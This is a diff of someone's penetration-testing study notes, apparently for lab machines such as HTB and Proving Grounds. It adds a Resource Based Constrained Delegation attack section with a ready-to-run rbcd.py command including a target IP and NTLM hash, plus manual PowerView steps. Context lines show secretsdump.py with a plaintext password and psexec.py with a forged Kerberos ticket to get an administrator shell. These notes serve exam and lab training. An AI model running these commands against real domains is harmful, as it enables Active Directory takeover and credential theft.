@@ -235,15 +235,15 @@ secretsdump.py "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"
 ```
 
 
-
 ---
 
-
-
-
-
-RBCD (Resource Based Constrained Delegation) Attack ^062636
-- Requirements:
+##### RBCD (Resource Based Constrained Delegation) Attack
+- automatic script from https://github.com/tothi/rbcd-attack and this blog https://medium.com/@ardian.danny/oscp-practice-series-65-proving-grounds-resourced-05eb9a129e28: 
+```
+sudo python3 /opt/rbcd-attack/rbcd.py -dc-ip 192.168.167.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
+```
+Manual method:
+- - Requirements:
 	- `SeMachineAccountPrivilege` shows enabled
 		- `whoami /priv` to check current user
 	- `Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota`
@@ -280,7 +280,7 @@ Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoacto
 ```
 - creating ACL step 4: applies security descriptor to the `msds-allowedtoactonbehalfofotheridentity` attribute of the target computer object
 	- check it worked:
-		- `$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity`
+		- `$RawBytes = Get-DomainComputer 0xdfFakeComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity`
 		- `$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0`
 		- `$Descriptor.DiscretionaryAcl`
 			- will display `AccessAllowed` under AceType if worked
@@ -307,6 +307,7 @@ KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -
 ```
 - saves ticket in cash and get shell as administrator
 
+---
 
 ***ReadGMSAPassword privilege in Bloodhound***
 can confirm account is a service account with GMSA enabled
